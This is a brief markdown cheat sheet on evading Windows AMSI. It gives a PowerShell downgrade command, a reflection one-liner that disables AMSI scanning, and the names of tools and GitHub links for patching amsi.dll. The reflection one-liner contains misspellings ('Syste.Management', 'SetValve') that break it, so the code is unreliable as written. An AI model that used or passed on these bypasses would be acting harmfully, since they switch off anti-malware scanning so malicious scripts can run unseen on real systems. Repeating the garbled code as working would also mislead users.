# Anti-Malware Scanning Interface (AMSI) Evasion

## Powershell Downgrade

#### powershell -Version 2

## Powershell Reflection

#### [Ref].Assembly.GetType('Syste.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValve($null,$true)

## Automation

### Tools: amsi.fail, AmsiTrigger

## Patching amsi.dll

### See a separate file in this repo.

### Resource: https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs

### Resource to practice AMSI bypass obfuscation techniques: https://github.com/RythmStick/AMSITrigger
